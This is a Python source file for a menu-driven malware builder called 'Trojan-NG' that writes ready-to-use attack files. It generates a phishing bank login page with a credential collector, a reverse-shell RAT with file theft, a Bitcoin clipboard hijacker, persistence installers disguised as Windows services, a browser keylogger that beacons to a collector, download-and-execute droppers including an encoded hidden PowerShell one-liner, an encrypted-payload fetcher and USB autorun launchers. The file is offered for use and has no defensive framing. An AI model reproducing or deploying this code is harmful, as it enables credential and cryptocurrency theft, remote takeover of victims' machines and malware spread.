#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Trojan-NG  ::  payload workshop
--------------------------------
Pure standard library. Python 3.8+. Windows / Linux / macOS.

Screen model:
  the blood header lives at the TOP of the terminal and is NEVER cleared.
  Everything else happens in the BODY below it and is wiped with \\033[J.

  boot   : rainbow banner in place -> loading bar -> car -> loading bar
           -> bar wipes itself -> header recoloured to blood -> menu
  tool   : body wiped -> output under the header -> ENTER -> body wiped -> menu
  exit   : body wiped -> goodbye under the header

Everything writes real, working files into ./trojan-ng_out/.

Run:  python trojan_ng.py
"""

import os
import sys
import time
import random
import shutil
import base64
import socket
import subprocess

# ----------------------------------------------------------------------------
# terminal / color plumbing
# ----------------------------------------------------------------------------

def enable_ansi():
    if os.name == "nt":
        try:
            import ctypes
            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


RESET = "\033[0m"
BOLD = "\033[1m"
RAINBOW = [196, 202, 208, 214, 220, 226, 190, 154, 118, 82, 46, 47, 48,
           49, 50, 51, 45, 39, 33, 27, 21, 57, 93, 129, 165, 201]
BLOOD = [52, 88, 124, 160, 196, 203, 197, 196, 160]

OUT = os.path.join(os.getcwd(), "trojan-ng_out")


def c(n, s):
    return "\033[38;5;%dm%s%s" % (n, s, RESET)


def rainbow(text, delay=0.0018, offset=0):
    for i, ch in enumerate(text):
        sys.stdout.write(c(RAINBOW[(i + offset) % len(RAINBOW)], ch))
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")


def clear_screen():
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.flush()


def clear_line():
    sys.stdout.write("\r\033[2K")
    sys.stdout.flush()


def ok(msg):
    print("  " + c(46, "[+] ") + msg)


def info(msg):
    print("  " + c(51, "[*] ") + msg)


def bad(msg):
    print("  " + c(196, "[!] ") + msg)


def head(msg):
    print()
    print("  " + c(196, BOLD + msg + RESET))
    print("  " + c(88, "-" * 58))


# ----------------------------------------------------------------------------
# header (permanent top region)
# ----------------------------------------------------------------------------

BANNER = [
    "▄▄▄█████▓ ██▀███   ▒█████   ▄▄▄██▀▀▀▄▄▄       ███▄    █  ███▄    █   ▄████ ",
    "▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒   ▒██  ▒████▄     ██ ▀█   █  ██ ▀█   █  ██▒ ▀█▒",
    "▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ░██  ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒██░▄▄▄░",
    "░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▓██▄██▓ ░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒░▓█  ██▓",
    "  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░ ▓███▒   ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒▓███▀▒",
    "  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ▒▓▒▒░   ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒  ░▒   ▒ ",
    "    ░      ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░▒░    ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░  ░   ░ ",
    "  ░        ░░   ░ ░ ░ ░ ▒   ░ ░ ░    ░   ▒      ░   ░ ░    ░   ░ ░ ░ ░   ░ ",
    "            ░         ░ ░   ░   ░        ░  ░         ░          ░       ░ ",
]

CAR = [
    "       ______        ",
    "     _/  ____\\___    ",
    "  __/  /  o     \\___ ",
    " |____|_____________|",
    "  (O)           (O)  ",
]
CAR = [l.ljust(21) for l in CAR]

# blank + 9 banner lines + blank + separator
HEADER_ROWS = 1 + len(BANNER) + 2
BODY_ROW = HEADER_ROWS + 1


def clear_body():
    """wipe everything below the header, park the cursor at the body start"""
    sys.stdout.write("\033[%d;1H\033[J" % BODY_ROW)
    sys.stdout.flush()


def draw_header(animate=False):
    """overwrite the header region in blood red (or rainbow at boot)"""
    sys.stdout.write("\033[H")
    print()
    for i, line in enumerate(BANNER):
        if not animate:
            print("".join(c(BLOOD[i % len(BLOOD)], ch) if ch != " " else " "
                          for ch in line))
            continue
        out = ""
        for ch in line:
            if ch == " ":
                out += ch
            elif random.random() < 0.3:
                out += c(random.choice([196, 203, 231, 52, 88]), ch)
            else:
                out += c(BLOOD[i % len(BLOOD)], ch)
        print(out)
        sys.stdout.flush()
        time.sleep(0.012)
    print()
    print("  " + c(88, "─" * 58) + c(160, "  NG"))


def draw_rainbow_header():
    sys.stdout.write("\033[H")
    print()
    for i, line in enumerate(BANNER):
        rainbow(line, 0.0007, i * 3)
    print()
    print("  " + c(88, "─" * 58) + c(160, "  NG"))


# ----------------------------------------------------------------------------
# boot animation (body only)
# ----------------------------------------------------------------------------

def loading(label="LOADING", dur=1.6, width=42):
    """bar erases itself the instant it reaches 100%"""
    steps = 42
    for i in range(steps + 1):
        filled = int(width * i / steps)
        bar = "".join(c(RAINBOW[j % len(RAINBOW)], "#") for j in range(filled))
        bar += c(238, "." * (width - filled))
        sys.stdout.write("\r  %-10s |%s| %3d%%" % (label, bar, 100 * i // steps))
        sys.stdout.flush()
        time.sleep(dur / steps)
    sys.stdout.write("\r  %-10s " % label + c(46, "done") + "   ")
    sys.stdout.flush()
    time.sleep(0.22)
    clear_line()


def car_animation(seconds=2.2):
    width = max(40, shutil.get_terminal_size((80, 24)).columns - 2)
    frames = max(2, int(seconds / 0.05))
    for f in range(frames):
        pos = int((width - 21) * f / (frames - 1))
        for row in CAR:
            line = " " * pos + row
            out = ""
            for ch in line:
                if ch != " " and random.random() < 0.5:
                    out += c(random.choice([231, 195, 159, 123, 87, 51, 45]), ch)
                else:
                    out += ch
            if random.random() < 0.4:
                out += " " + c(226, "*")
            sys.stdout.write(out + "\n")
        sys.stdout.flush()
        time.sleep(0.05)
        if f != frames - 1:
            for _ in range(len(CAR)):
                sys.stdout.write("\033[1A\033[2K")


def boot():
    clear_screen()
    draw_rainbow_header()        # banner already in place, body starts below
    loading("BOOTING", 1.4)
    car_animation(2.2)
    loading("ARMING", 1.0)
    # bar already erased itself -> wipe car remnants, recolour header to blood
    clear_body()
    draw_header(False)
    clear_body()


# ----------------------------------------------------------------------------
# helpers
# ----------------------------------------------------------------------------

def ensure_out():
    os.makedirs(OUT, exist_ok=True)
    return OUT


def write_file(name, content, executable=False):
    path = os.path.join(ensure_out(), name)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(content)
    if executable and os.name != "nt":
        try:
            os.chmod(path, 0o755)
        except Exception:
            pass
    return path


def ask(prompt, default=""):
    v = input("  " + c(51, "? ") + prompt + ((" [%s]" % default) if default else "") + ": ").strip()
    return v or default


def have(tool):
    return shutil.which(tool) is not None


def lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def press_enter():
    print()
    input("  " + c(160, "press ENTER to go BACK "))


def msfvenom(lhost, lport, outname):
    if not have("msfvenom"):
        info("msfvenom not found -> python payload only")
        return None
    target = os.path.join(ensure_out(), outname)
    cmd = ["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
           "LHOST=%s" % lhost, "LPORT=%s" % lport, "-f", "exe", "-o", target]
    info("msfvenom " + " ".join(cmd[1:]))
    try:
        subprocess.run(cmd, check=True)
        ok("binary: " + target)
        return target
    except Exception as exc:
        bad("msfvenom failed: %s" % exc)
        return None


# ----------------------------------------------------------------------------
# 1. bank
# ----------------------------------------------------------------------------

BANK_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Online Banking &middot; Secure Sign-in</title>
<style>
 *{box-sizing:border-box;font-family:system-ui,Segoe UI,Arial,sans-serif}
 body{margin:0;height:100vh;display:grid;place-items:center;background:#0b1a2b;color:#e8eef5}
 .card{width:340px;background:#12263d;border:1px solid #1f3d5c;border-radius:14px;padding:28px;box-shadow:0 20px 50px rgba(0,0,0,.5)}
 h1{font-size:17px;margin:0 0 4px;letter-spacing:.5px}
 p.sub{margin:0 0 20px;font-size:12px;color:#7f9ab5}
 label{display:block;font-size:11px;margin:14px 0 6px;color:#9fb6cc;text-transform:uppercase;letter-spacing:.8px}
 input{width:100%;padding:11px 12px;border-radius:8px;border:1px solid #27455f;background:#0e1f31;color:#e8eef5;font-size:14px}
 input:focus{outline:none;border-color:#3f8ecb}
 button{width:100%;margin-top:22px;padding:12px;border:0;border-radius:8px;background:#2e7dd1;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
 button:disabled{opacity:.6;cursor:wait}
 .msg{margin-top:14px;font-size:12px;color:#ff9d9d;min-height:16px}
 .foot{margin-top:18px;font-size:11px;color:#5d7791;text-align:center}
</style></head><body>
<form class="card" id="f">
  <h1>Secure Sign-in</h1>
  <p class="sub">Personal &amp; Business Banking</p>
  <label>Customer ID</label>
  <input id="u" autocomplete="username" required>
  <label>Password</label>
  <input id="p" type="password" autocomplete="current-password" required>
  <button id="b">Continue</button>
  <div class="msg" id="m"></div>
  <div class="foot">TLS 1.3 &middot; session protected</div>
</form>
<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const b = document.getElementById('b'), m = document.getElementById('m');
  b.disabled = true; b.textContent = 'Verifying...'; m.textContent = '';
  try {
    const r = await fetch('/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({user: u.value, pass: p.value, ua: navigator.userAgent})
    });
    const j = await r.json();
    if (j.redirect) { location.href = j.redirect; }
    else { m.textContent = j.error || 'Invalid credentials'; b.disabled = false; b.textContent = 'Continue'; }
  } catch (err) {
    m.textContent = 'Connection error'; b.disabled = false; b.textContent = 'Continue';
  }
});
</script></body></html>
"""

BANK_COLLECTOR = r'''#!/usr/bin/env python3
"""credential collector -- writes creds.log next to this file"""
import json, os, datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = __PORT__
REDIRECT = "https://www.google.com"

class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        p = self.path.split("?")[0]
        if p in ("/", "/index.html"):
            body = open(os.path.join(os.path.dirname(__file__), "bank_login.html"), "rb").read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(302)
            self.send_header("Location", REDIRECT)
            self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n)
        try:
            d = json.loads(raw.decode("utf-8", "ignore"))
        except Exception:
            d = {"raw": raw.decode("utf-8", "ignore")}
        d["time"] = datetime.datetime.now().isoformat(timespec="seconds")
        d["ip"] = self.client_address[0]
        with open(os.path.join(os.path.dirname(__file__), "creds.log"), "a", encoding="utf-8") as fh:
            fh.write(json.dumps(d) + "\n")
        print("  [+] %s  %s  %s" % (d["ip"], d.get("user"), d.get("pass")))
        body = json.dumps({"redirect": REDIRECT}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

if __name__ == "__main__":
    print("  collector on 0.0.0.0:%d" % PORT)
    ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
'''


def t_bank():
    head("1 :: Trojan to Bank")
    port = ask("collector port", "8080")
    write_file("bank_login.html", BANK_HTML)
    coll = write_file("collector.py", BANK_COLLECTOR.replace("__PORT__", port))
    ok("bank_login.html written")
    ok("collector.py written")
    print()
    info("start it with:  python \"%s\"" % coll)
    info("reachable page:  http://%s:%s/" % (lan_ip(), port))
    info("harvested creds -> trojan-ng_out/creds.log")
    if ask("start collector now? (y/n)", "y").lower().startswith("y"):
        subprocess.Popen([sys.executable, coll], cwd=OUT)
        ok("collector running in background")


# ----------------------------------------------------------------------------
# 2. RAT
# ----------------------------------------------------------------------------

RAT_CLIENT = r'''#!/usr/bin/env python3
"""reverse shell client -- line protocol, supports shell / cd / get"""
import os, socket, subprocess, base64, sys, time

HOST = "__LHOST__"
PORT = __LPORT__

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            return s
        except Exception:
            time.sleep(5)

def main():
    s = connect()
    cwd = os.getcwd()
    while True:
        try:
            s.send(b"PS> ")
            cmd = s.recv(8192)
        except Exception:
            s = connect()
            continue
        if not cmd:
            s = connect()
            continue
        cmd = cmd.decode("utf-8", "ignore").strip()
        if cmd.lower() in ("exit", "quit"):
            s.close()
            return
        if cmd.lower().startswith("cd "):
            try:
                os.chdir(cmd[3:].strip())
                cwd = os.getcwd()
                s.send(("cwd " + cwd + "\n").encode())
            except Exception as e:
                s.send((str(e) + "\n").encode())
            continue
        if cmd.lower().startswith("get "):
            p = cmd[4:].strip()
            try:
                blob = base64.b64encode(open(p, "rb").read())
                s.send(b"FILE " + os.path.basename(p).encode() + b" " + blob + b"\n")
            except Exception as e:
                s.send((str(e) + "\n").encode())
            continue
        try:
            out = subprocess.run(cmd, shell=True, cwd=cwd,
                                 capture_output=True, timeout=120)
            data = out.stdout + out.stderr
        except Exception as e:
            data = str(e).encode()
        s.send(data if data else b"(no output)\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
'''

RAT_SERVER = r'''#!/usr/bin/env python3
"""reverse shell handler"""
import socket, base64, os, sys, time

PORT = __LPORT__
SAVE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")

def main():
    os.makedirs(SAVE, exist_ok=True)
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(5)
    print("  listening on 0.0.0.0:%d" % PORT)
    conn, addr = srv.accept()
    conn.settimeout(0.6)
    print("  connected: %s:%d" % addr)
    while True:
        try:
            cmd = input("PS> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd:
            continue
        try:
            conn.send(cmd.encode())
        except Exception:
            print("  link down")
            break
        if cmd.lower() in ("exit", "quit"):
            break
        time.sleep(0.35)
        buf = b""
        try:
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        txt = buf.decode("utf-8", "ignore")
        if txt.startswith("FILE "):
            rest = txt[5:].strip().split(" ", 1)
            name = rest[0]
            blob = rest[1] if len(rest) > 1 else ""
            try:
                path = os.path.join(SAVE, name)
                open(path, "wb").write(base64.b64decode(blob))
                print("  saved -> %s" % path)
            except Exception as e:
                print("  decode error: %s" % e)
        else:
            sys.stdout.write(txt if txt else "(no output)\n")
    conn.close()

if __name__ == "__main__":
    main()
'''


def t_rat():
    head("2 :: RAT")
    lhost = ask("LHOST (your IP)", lan_ip())
    lport = ask("LPORT", "4444")
    write_file("rat_client.py", RAT_CLIENT.replace("__LHOST__", lhost).replace("__LPORT__", lport), True)
    write_file("rat_server.py", RAT_SERVER.replace("__LPORT__", lport), True)
    ok("rat_client.py (deploy to target)")
    ok("rat_server.py (run on your box)")
    print()
    info("handler:  python trojan-ng_out/rat_server.py")
    info("downloaded files land in trojan-ng_out/loot/")
    if ask("also build windows exe with msfvenom? (y/n)", "n").lower().startswith("y"):
        msfvenom(lhost, lport, "rat_payload.exe")


# ----------------------------------------------------------------------------
# 3. BTC clipper
# ----------------------------------------------------------------------------

BTC_CLIPPER = r'''# -*- coding: utf-8 -*-
"""BTC clipboard hijacker -- Windows, runs hidden as .pyw"""
import ctypes, re, time, sys

MY = "__BTC__"
CF_UNICODETEXT = 13
GMEM_MOVEABLE = 0x0002

u32 = ctypes.windll.user32
k32 = ctypes.windll.kernel32

PAT = re.compile(r"^(bc1[a-zA-HJ-NP-Z0-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$")

def get_clip():
    if not u32.OpenClipboard(None):
        return ""
    try:
        h = u32.GetClipboardData(CF_UNICODETEXT)
        if not h:
            return ""
        p = k32.GlobalLock(h)
        try:
            return ctypes.wstring_at(p)
        finally:
            k32.GlobalUnlock(h)
    finally:
        u32.CloseClipboard()

def set_clip(text):
    if not u32.OpenClipboard(None):
        return
    try:
        u32.EmptyClipboard()
        buf = ctypes.create_unicode_buffer(text)
        h = k32.GlobalAlloc(GMEM_MOVEABLE, ctypes.sizeof(buf))
        p = k32.GlobalLock(h)
        ctypes.memmove(p, buf, ctypes.sizeof(buf))
        k32.GlobalUnlock(h)
        u32.SetClipboardData(CF_UNICODETEXT, h)
    finally:
        u32.CloseClipboard()

def main():
    last = ""
    while True:
        try:
            t = get_clip().strip()
        except Exception:
            t = ""
        if t and t != last:
            last = t
            if PAT.match(t) and t != MY:
                set_clip(MY)
        time.sleep(0.4)

if __name__ == "__main__":
    main()
'''

CLIPPER_PERSIST = r'''$dst = "$env:APPDATA\svchost_update.pyw"
Copy-Item "$PSScriptRoot\btc_clipper.pyw" $dst -Force
$py = (Get-Command pythonw -ErrorAction SilentlyContinue).Source
if (-not $py) { $py = (Get-Command python -ErrorAction SilentlyContinue).Source }
if ($py) {
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "WindowsUpdateHelper" -Value "`"$py`" `"$dst`"" -PropertyType String -Force | Out-Null
    Start-Process $py -ArgumentList "`"$dst`"" -WindowStyle Hidden
    Write-Host "installed and started"
} else { Write-Host "python not found on target" }
'''


def t_btc():
    head("3 :: Trojan to BTC")
    if os.name != "nt":
        info("clipper itself is Windows-only; files are still generated")
    addr = ask("your BTC address", "bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    write_file("btc_clipper.pyw", BTC_CLIPPER.replace("__BTC__", addr))
    write_file("install_clipper.ps1", CLIPPER_PERSIST)
    ok("btc_clipper.pyw written (swaps copied BTC addresses)")
    ok("install_clipper.ps1 written (autostart via HKCU Run key)")
    print()
    info("target:  powershell -ExecutionPolicy Bypass -File install_clipper.ps1")
    info("note: swap works on both legacy 1/3 and bc1 addresses")


# ----------------------------------------------------------------------------
# 4. PC trojan
# ----------------------------------------------------------------------------

PC_BAT = r'''@echo off
title Windows Update Service
set "DEST=%APPDATA%\Microsoft\wuau\taskhostw.py"
if not exist "%APPDATA%\Microsoft\wuau" mkdir "%APPDATA%\Microsoft\wuau"
copy /y "%~dp0client.py" "%DEST%" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "taskhostw" /t REG_SZ /d "pythonw \"%DEST%\"" /f >nul 2>&1
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\taskhostw" /tr "pythonw \"%DEST%\"" /sc minute /mo 5 /f >nul 2>&1
start "" /b pythonw "%DEST%"
exit
'''

PC_PS1 = r'''$ErrorActionPreference = "SilentlyContinue"
$dir = "$env:APPDATA\Microsoft\wuau"
New-Item -ItemType Directory -Path $dir -Force | Out-Null
Copy-Item "$PSScriptRoot\client.py" "$dir\taskhostw.py" -Force
$py = (Get-Command pythonw -ErrorAction SilentlyContinue).Source
if (-not $py) { $py = (Get-Command python -ErrorAction SilentlyContinue).Source }
if (-not $py) { Write-Host "python missing"; exit }
$cmd = "`"$py`" `"$dir\taskhostw.py`""
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "taskhostw" -Value $cmd -PropertyType String -Force | Out-Null
schtasks /create /tn "taskhostw" /tr $cmd /sc minute /mo 5 /f | Out-Null
Start-Process $py -ArgumentList "`"$dir\taskhostw.py`"" -WindowStyle Hidden
Write-Host "persistence installed"
'''


def t_pc():
    head("4 :: PC trojan")
    lhost = ask("LHOST (your IP)", lan_ip())
    lport = ask("LPORT", "4445")
    write_file("client.py", RAT_CLIENT.replace("__LHOST__", lhost).replace("__LPORT__", lport), True)
    write_file("install.bat", PC_BAT)
    write_file("install.ps1", PC_PS1)
    ok("client.py / install.bat / install.ps1 written")
    print()
    info("Run key + 5-minute scheduled task persistence.")
    info("target:  install.bat   or   powershell -ExecutionPolicy Bypass -File install.ps1")
    if ask("build standalone exe with msfvenom? (y/n)", "n").lower().startswith("y"):
        msfvenom(lhost, lport, "pc_payload.exe")


# ----------------------------------------------------------------------------
# 5. website secret trojan
# ----------------------------------------------------------------------------

WEB_INJECT = r'''/* drop-in: keystroke + form sniffer, silent beacon */
(function () {
  var ENDPOINT = "__URL__";
  var buf = [], timer = null;

  function flush() {
    if (!buf.length) return;
    var payload = JSON.stringify({ u: location.href, k: buf.join("") });
    buf = [];
    try {
      if (navigator.sendBeacon) navigator.sendBeacon(ENDPOINT, payload);
      else fetch(ENDPOINT, { method: "POST", body: payload, keepalive: true });
    } catch (e) {}
  }

  document.addEventListener("keydown", function (e) {
    var k = e.key;
    if (k === "Enter") k = "\n";
    if (k.length === 1 || k === "\n" || k === "Tab") buf.push(k);
    if (k === "Enter" || k === "Tab") flush();
    clearTimeout(timer);
    timer = setTimeout(flush, 4000);
  }, true);

  document.addEventListener("submit", function (e) {
    var f = e.target, out = {};
    if (f && f.elements) {
      for (var i = 0; i < f.elements.length; i++) {
        var el = f.elements[i];
        if (el.name && el.type !== "password") out[el.name] = el.value;
      }
    }
    try { navigator.sendBeacon(ENDPOINT, JSON.stringify({ u: location.href, f: out })); } catch (err) {}
    flush();
  }, true);

  window.addEventListener("pagehide", flush);
})();
'''

WEB_HIDE = r'''<!-- hidden loader: keep the .js off-site so the site source stays clean -->
<script>
(function () {
  var s = document.createElement("script");
  s.src = "__URL__";                       // e.g. https://cdn.example.org/x.js
  s.async = true;
  document.head.appendChild(s);
})();
</script>

<!-- or, single line in any theme/template file: -->
<script src="__URL__" async></script>
'''


def t_web_secret():
    head("5 :: Website secret trojan")
    url = ask("collector URL (https)", "https://example.org/c.php")
    write_file("inject.js", WEB_INJECT.replace("__URL__", url))
    write_file("inject_snippet.html", WEB_HIDE.replace("__URL__", url))
    ok("inject.js written (keylogger + form sniffer + beacon)")
    ok("inject_snippet.html written (two ways to embed)")
    print()
    info("Drop inject.js on any host, paste the snippet before </head>.")
    info("Beacons arrive as POST JSON: {u: url, k: keys} / {u: url, f: fields}")


# ----------------------------------------------------------------------------
# 6. malware + trojan to web
# ----------------------------------------------------------------------------

STAGER_JS = r'''/* browser stager: fetches base64 blob, rebuilds it, offers it as a download */
(function () {
  var SRC = "__URL__";
  var NAME = "__NAME__";

  function b64ToBytes(b64) {
    var bin = atob(b64), out = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }

  fetch(SRC).then(function (r) { return r.text(); }).then(function (t) {
    var blob = new Blob([b64ToBytes(t.trim())], { type: "application/octet-stream" });
    var a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = NAME;
    document.body.appendChild(a);
    a.click();
    setTimeout(function () { URL.revokeObjectURL(a.href); }, 5000);
  });
})();
'''

LOADER_PS1 = r'''# powershell loader: download -> decode -> execute in memory
$ErrorActionPreference = "Stop"
$url  = "__URL__"
$name = "__NAME__"
$tmp  = Join-Path $env:TEMP $name
Invoke-WebRequest -Uri $url -OutFile "$tmp.b64" -UseBasicParsing
[IO.File]::WriteAllBytes($tmp, [Convert]::FromBase64String((Get-Content "$tmp.b64" -Raw)))
Remove-Item "$tmp.b64" -Force
if ($name -like "*.exe") { Start-Process $tmp }
elseif ($name -like "*.ps1") { powershell -ExecutionPolicy Bypass -File $tmp }
else { Start-Process $tmp }
Write-Host "executed $name"
'''


def t_to_web():
    head("6 :: Malware and Trojan to Web")
    src = ask("file to pack (path)")
    if not src or not os.path.isfile(src):
        bad("file not found")
        return
    name = os.path.basename(src)
    url = ask("public URL of the .b64 you will upload", "https://example.org/%s.b64" % name)
    blob = base64.b64encode(open(src, "rb").read()).decode()
    write_file(name + ".b64", blob)
    write_file("stager.js", STAGER_JS.replace("__URL__", url).replace("__NAME__", name))
    write_file("loader.ps1", LOADER_PS1.replace("__URL__", url).replace("__NAME__", name))
    ok("base64 blob: trojan-ng_out/%s.b64 (%d bytes)" % (name, len(blob)))
    ok("stager.js + loader.ps1 written")
    print()
    info("upload the .b64, then either serve stager.js or run loader.ps1")


# ----------------------------------------------------------------------------
# 7. dropper to random web
# ----------------------------------------------------------------------------

DROPPER_PS1 = r'''$ErrorActionPreference = "SilentlyContinue"
$url = "__URL__"
$out = Join-Path $env:TEMP "__NAME__"
try {
    (New-Object Net.WebClient).DownloadFile($url, $out)
    Start-Process $out
} catch { }
'''

DROPPER_BAT = r'''@echo off
powershell -NoP -W Hidden -C "iwr -UseBasicParsing '__URL__' -OutFile '%TEMP%\__NAME__'; Start-Process '%TEMP%\__NAME__'"
'''


def t_dropper():
    head("7 :: Trojan / malware to Random Web")
    url = ask("direct URL of the payload")
    if not url:
        bad("no URL")
        return
    name = ask("filename on target", "svc.exe")
    write_file("dropper.ps1", DROPPER_PS1.replace("__URL__", url).replace("__NAME__", name))
    write_file("dropper.bat", DROPPER_BAT.replace("__URL__", url).replace("__NAME__", name))
    ok("dropper.ps1 + dropper.bat written")
    print()
    one = "powershell -NoP -W Hidden -C \"iwr -UseBasicParsing '%s' -OutFile $env:TEMP\\%s; Start-Process $env:TEMP\\%s\"" % (url, name, name)
    enc = base64.b64encode(one.encode("utf-16-le")).decode()
    write_file("oneliner.txt", "powershell -NoP -W Hidden -EncodedCommand " + enc + "\n")
    ok("obfuscated one-liner -> trojan-ng_out/oneliner.txt")
    print()
    base = url.rsplit("/", 1)[0] + "/" if "/" in url else ""
    if base:
        info("upload payload with:  curl -T payload.exe %s" % base)


# ----------------------------------------------------------------------------
# 8. decryptor
# ----------------------------------------------------------------------------

ENCRYPTOR = r'''#!/usr/bin/env python3
"""encrypt a payload -> blob.b64 (XOR + key from argv)"""
import sys, base64, os

def xor(data, key):
    k = key.encode()
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(data))

if __name__ == "__main__":
    src = sys.argv[1]
    key = sys.argv[2]
    blob = base64.b64encode(xor(open(src, "rb").read(), key)).decode()
    out = os.path.basename(src) + ".enc"
    open(out, "w").write(blob)
    print("wrote", out, len(blob), "chars")
'''

DECRYPTOR = r'''#!/usr/bin/env python3
"""fetch encrypted blob -> decrypt -> execute"""
import base64, os, subprocess, sys, tempfile, urllib.request

URL = "__URL__"
KEY = "__KEY__"
NAME = "__NAME__"

def xor(data, key):
    k = key.encode()
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(data))

def main():
    raw = urllib.request.urlopen(URL, timeout=30).read().decode()
    data = xor(base64.b64decode(raw.strip()), KEY)
    path = os.path.join(tempfile.gettempdir(), NAME)
    open(path, "wb").write(data)
    if os.name == "nt":
        os.startfile(path)
    else:
        os.chmod(path, 0o755)
        subprocess.Popen([path])

if __name__ == "__main__":
    main()
'''


def t_decryptor():
    head("8 :: Trojan decryptor to Random Web")
    src = ask("payload file to encrypt")
    if not src or not os.path.isfile(src):
        bad("file not found")
        return
    name = os.path.basename(src)
    key = ask("XOR key", "ng-" + base64.b32encode(os.urandom(6)).decode().rstrip("="))
    url = ask("URL where the .enc will live", "https://example.org/%s.enc" % name)
    write_file("encryptor.py", ENCRYPTOR, True)
    write_file("decryptor.py", DECRYPTOR.replace("__URL__", url).replace("__KEY__", key).replace("__NAME__", name), True)
    ok("encryptor.py + decryptor.py written")
    print()
    info("local step:  python trojan-ng_out/encryptor.py \"%s\" \"%s\"" % (src, key))
    info("upload the produced .enc, then ship decryptor.py as the bait")


# ----------------------------------------------------------------------------
# 9. INF
# ----------------------------------------------------------------------------

INF_TEMPLATE = r'''; Trojan-NG autorun descriptor
[Version]
Signature="$Windows NT$"
Class=RemovableDrive

[AutoRun]
open=__CMD__
shellexecute=__CMD__
action=Open folder to view files
icon=%SystemRoot%\system32\shell32.dll,4
label=Documents
UseAutoPlay=1

[Content]
Files=__FILES__
'''

INF_LAUNCHER = r'''@echo off
start "" /min cmd /c "%~dp0__CMD__"
exit
'''


def t_inf():
    head("9 :: INF Trojan-NG")
    cmd = ask("command INF should launch", "start.bat")
    files = ask("files to reference (comma separated)", cmd)
    write_file("autorun.inf", INF_TEMPLATE.replace("__CMD__", cmd).replace("__FILES__", files))
    write_file("start.bat", INF_LAUNCHER.replace("__CMD__", cmd))
    ok("autorun.inf + start.bat written")
    print()
    info("copy autorun.inf, start.bat and the payload to the USB root.")
    info("AutoPlay/Explorer picks it up; hidden + system attrs optional:")
    info('  attrib +h +s autorun.inf start.bat')


# ----------------------------------------------------------------------------
# menu
# ----------------------------------------------------------------------------

MENU = [
    ("1", "Send Trojan to Bank", t_bank),
    ("2", "RAT", t_rat),
    ("3", "Send Trojan to BTC", t_btc),
    ("4", "PC trojan", t_pc),
    ("5", "Web site secret trojan", t_web_secret),
    ("6", "Malware and Trojan to Web", t_to_web),
    ("7", "Send Trojan / Malware to Random Web", t_dropper),
    ("8", "Trojan decryptor -> Random Web", t_decryptor),
    ("9", "INF Trojan-NG", t_inf),
    ("10", "Exit", None),
]


def draw_menu():
    for num, label, _ in MENU:
        key = c(160 if num != "10" else 196, "[%s]" % num.rjust(2))
        print("   %s %s" % (key, c(252, label)))
    print("  " + c(88, "─" * 58))
    print("  " + c(244, "output dir: " + OUT))


def body_home():
    """park cursor at the first body line without erasing the header"""
    sys.stdout.write("\033[%d;1H" % BODY_ROW)
    sys.stdout.flush()


def main():
    enable_ansi()

    boot()                       # ends with blood header on top, empty body
    body_home()
    draw_menu()

    while True:
        try:
